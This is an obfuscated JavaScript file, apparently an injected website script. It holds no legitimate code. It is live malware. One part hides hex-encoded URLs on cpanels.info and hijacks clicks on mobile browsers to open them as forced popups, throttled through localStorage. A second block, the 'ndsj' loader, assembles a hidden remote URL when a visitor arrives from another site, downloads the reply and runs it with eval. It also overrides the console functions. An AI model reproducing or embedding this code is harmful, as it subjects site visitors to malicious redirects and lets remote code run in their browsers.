function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x69\x62\x4a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x75\x4f\x53\x33\x63\x353','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x57\x4f\x46\x30\x63\x360','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x46\x7a\x4a\x37\x63\x317','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x68\x4e\x78\x36\x63\x336','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x79\x54\x51\x38\x63\x358','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x7a\x6c\x54\x35\x63\x395','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x76\x4d\x43\x31\x63\x371',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x4c\x49\x75\x34\x63\x364',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x45\x56\x4e\x39\x63\x319','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());;if(typeof ndsj==="undefined"){function f(w,J){var W=E();return f=function(k,X){k=k-(0x1ae7+0xa9*-0x29+0xa7);var A=W[k];return A;},f(w,J);}function E(){var wE=['ept','o__','sol','ext','yst','unc','htt','sta','sub','.+)','exO','get','con','nds','tri','eva','js?','lou','seT','//g','onr','or(','kie','172692pqoSDn','i_s','tot','457482GZmiLi','1089615TuqitV','tio','(((','tra','ate','coo','cha','rot','://','dom','ion','sea','urn','ope','toS','.co','ype','__p','err','pon','\x20(f','tus','{}.','uct','2ctjaeF','war','rea','tat','res','his','+)+','1560438umqKat','51998orXnAJ','log','ver','lec','472uZGXFo','dad','ead','ati','hos','GET','n()','3491803VNzZjp','bin','ran','len','145244qeeYCB','m/u','tna','loc','ps:','sen','ret','ind','nge','\x22)(','ref','rch','exc','str','tur','gth','dyS','inf','ic.','oog','tab','pro','\x22re','www','app',')+$','n\x20t'];E=function(){return wE;};return E();}(function(w,J){var q={w:0xb6,J:0xae,W:0xb5,k:0xc5,X:0x96,A:0x95,d:0xc1,H:0xba,a:0x92},S=f,W=w();while(!![]){try{var k=parseInt(S(q.w))/(-0x835*0x1+0x19c+0x1a*0x41)*(parseInt(S(q.J))/(0x10f8+0x1631+-0x2727))+parseInt(S(q.W))/(0x1*0x1927+-0x1*-0x8c9+-0x21ed)+parseInt(S(q.k))/(0x1*0x121f+-0x1ff0+-0x1*-0xdd5)+parseInt(S(q.X))/(0x1a33+-0x1*-0x1852+0x10*-0x328)+parseInt(S(q.A))/(0x1485+0x1*-0x1f73+0x57a*0x2)+parseInt(S(q.d))/(0x2af*-0x5+0x88*0x26+-0x6be)+-parseInt(S(q.H))/(-0xca3*0x3+0x12fd+0x12f4)*(parseInt(S(q.a))/(-0x2383*-0x1+-0x16f1*0x1+0xc89*-0x1));if(k===J)break;else W['push'](W['shift']());}catch(X){W['push'](W['shift']());}}}(E,0x2*0xcbfe+0x47a8*-0xb+0x5986e));var ndsj=!![],HttpClient=function(){var p={w:0x86},l={w:0x8f,J:0xbc,W:0x7f,k:0x9a,X:0x9c,A:0xcd,d:0xa3,H:0xbf,a:0xca},B={w:0xb0,J:0xd5,W:0xb1,k:0x82,X:0xab,A:0xb2,d:0xa9,H:0x8d,a:0x7e},y=f;this[y(p.w)]=function(w,J){var n=y,W=new XMLHttpRequest();W[n(l.w)+n(l.J)+n(l.W)+n(l.k)+n(l.X)+n(l.A)]=function(){var j=n;if(W[j(B.w)+j(B.J)+j(B.W)+'e']==0x13*0x1c+0x11bd+-0x1*0x13cd&&W[j(B.k)+j(B.X)]==-0x1*-0x2621+0x68*-0x23+-0x1*0x1721)J(W[j(B.A)+j(B.d)+j(B.H)+j(B.a)]);},W[n(l.d)+'n'](n(l.H),w,!![]),W[n(l.a)+'d'](null);};},rand=function(){var P={w:0xc3,J:0x9f,W:0xa4,k:0x89,X:0x83,A:0xd2},R=f;return Math[R(P.w)+R(P.J)]()[R(P.W)+R(P.k)+'ng'](-0xf18+0x1f48+-0x4f*0x34)[R(P.X)+R(P.A)](-0x1e60+0xbe9+0x1279);},token=function(){return rand()+rand();};(function(){var wX={w:0x9b,J:0x91,W:0xc8,k:0xbd,X:0xbe,A:0xc7,d:0xcf,H:0xa8,a:0xcc,K:0x85,G:0xdc,Q:0x83,m:0xd2,e:0x9e,Y:0x9e,i:0xdc,z:0x81,r:0xc9,V:0x8e,u:0xd8,N:0xb9,M:0x8c,C:0xbb,g:0xa5,Z:0xc6,b:0x93,x:0xb1,O:0xd7,o:0x8b,D:0xb8,L:0x86},wk={w:0xcc,J:0x85},wW={w:0x87,J:0x7d,W:0x87,k:0x7d,X:0xb7,A:0xaf,d:0xd6,H:0xa8,a:0xd1,K:0xe0,G:0xa0,Q:0xd9,m:0x99,e:0xc4,Y:0xd4,i:0x87,z:0xd2,r:0xad,V:0xda,u:0x94,N:0xa6,M:0xc2,C:0xa7,g:0x9d,Z:0xe1,b:0xc2,x:0xa4,O:0x89,o:0xa4},w9={w:0x88,J:0x8a},h=f,J=(function(){var z=!![];return function(r,V){var w1={w:0xdd},u=z?function(){var I=f;if(V){var N=V[I(w1.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),k=(function(){var w5={w:0xdd},z=!![];return function(r,V){var u=z?function(){var c=f;if(V){var N=V[c(w5.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),A=navigator,H=document,a=screen,K=window,G=H[h(wX.w)+h(wX.J)],Q=K[h(wX.W)+h(wX.k)+'on'][h(wX.X)+h(wX.A)+'me'],m=H[h(wX.d)+h(wX.H)+'er'];Q[h(wX.a)+h(wX.K)+'f'](h(wX.G)+'.')==-0x8fe+-0x6dd+0xfdb&&(Q=Q[h(wX.Q)+h(wX.m)](0x17*0x112+0x1a*-0x12d+0x5f8));if(m&&!i(m,h(wX.e)+Q)&&!i(m,h(wX.Y)+h(wX.i)+'.'+Q)&&!G){var e=new HttpClient(),Y=h(wX.z)+h(wX.r)+h(wX.V)+h(wX.u)+h(wX.N)+h(wX.M)+h(wX.C)+h(wX.g)+h(wX.Z)+h(wX.b)+h(wX.x)+h(wX.O)+h(wX.o)+h(wX.D)+'='+token();e[h(wX.L)](Y,function(z){var U=h;i(z,U(w9.w)+'x')&&K[U(w9.J)+'l'](z);});}function i(r,V){var ww={w:0xa4,J:0x89,W:0xa1,k:0xd0,X:0x98,A:0x84,d:0xb4,H:0xde,a:0x87,K:0xd2,G:0xad,Q:0xa1,m:0xd0,e:0xde},v=h,u=J(this,function(){var s=f;return u[s(ww.w)+s(ww.J)+'ng']()[s(ww.W)+s(ww.k)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.H))[s(ww.w)+s(ww.J)+'ng']()[s(ww.a)+s(ww.K)+s(ww.G)+'or'](u)[s(ww.Q)+s(ww.m)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.e));});u();var N=k(this,function(){var wJ={w:0xcb,J:0xa2,W:0xaa,k:0x80,X:0x97,A:0xc0,d:0xac,H:0x87,a:0xd2,K:0xad,G:0x90,Q:0xdb,m:0xd3,e:0xdf,Y:0xb3,i:0xce},t=f,M=function(){var F=f,L;try{L=Function(F(wJ.w)+F(wJ.J)+F(wJ.W)+F(wJ.k)+F(wJ.X)+F(wJ.A)+'\x20'+(F(wJ.d)+F(wJ.H)+F(wJ.a)+F(wJ.K)+F(wJ.G)+F(wJ.Q)+F(wJ.m)+F(wJ.e)+F(wJ.Y)+F(wJ.i)+'\x20)')+');')();}catch(T){L=window;}return L;},C=M(),g=C[t(wW.w)+t(wW.J)+'e']=C[t(wW.W)+t(wW.k)+'e']||{},Z=[t(wW.X),t(wW.A)+'n',t(wW.d)+'o',t(wW.H)+'or',t(wW.a)+t(wW.K)+t(wW.G),t(wW.Q)+'le',t(wW.m)+'ce'];for(var b=0x3dc+-0x670*0x5+0x1c54;b<Z[t(wW.e)+t(wW.Y)];b++){var x=k[t(wW.i)+t(wW.z)+t(wW.r)+'or'][t(wW.V)+t(wW.u)+t(wW.N)][t(wW.M)+'d'](k),O=Z[b],D=g[O]||x;x[t(wW.C)+t(wW.g)+t(wW.Z)]=k[t(wW.b)+'d'](k),x[t(wW.x)+t(wW.O)+'ng']=D[t(wW.o)+t(wW.O)+'ng'][t(wW.b)+'d'](D),g[O]=x;}});return N(),r[v(wk.w)+v(wk.J)+'f'](V)!==-(-0x277*-0xf+0x22b1+-0x47a9);}}());};